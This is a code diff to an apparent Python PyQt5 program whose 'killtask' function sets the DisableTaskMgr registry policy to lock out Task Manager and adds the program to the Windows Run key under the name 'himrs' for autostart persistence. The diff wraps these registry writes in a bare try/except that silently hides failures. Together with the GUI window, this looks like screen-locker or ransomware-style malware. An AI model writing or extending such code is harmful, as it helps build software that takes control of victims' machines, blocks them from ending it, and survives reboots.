@@ -1,4 +1,5 @@
 from PyQt5 import QtCore, QtGui, QtWidgets
+from PyQt5.QtGui import QIcon
 import sys
 import os
 import uuid
@@ -47,10 +48,13 @@ def killtask(key):
     reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
     key_name = "DisableTaskMgr"
-    keys = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
-    winreg.SetValueEx(keys, key_name, 0, winreg.REG_DWORD, key)
-    winreg.CloseKey(keys)
-    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
+    try:
+        keys = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(keys, key_name, 0, winreg.REG_DWORD, key)
+        winreg.CloseKey(keys)
+        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
+    except:
+        pass
     try:
         if key == 1:
             winreg.SetValueEx(reg_key, "himrs", 0, winreg.REG_SZ, filepath)
@@ -118,6 +122,7 @@ class Ui_Form():
         self.label.setStyleSheet("image: url(:/himzhaopian/him.png);")
         self.label.setText("")
         self.label.setObjectName("label")
+
 
         self.textEdit = QtWidgets.QTextEdit(Form)
         self.textEdit.setGeometry(QtCore.QRect(300, 10, 351, 461))
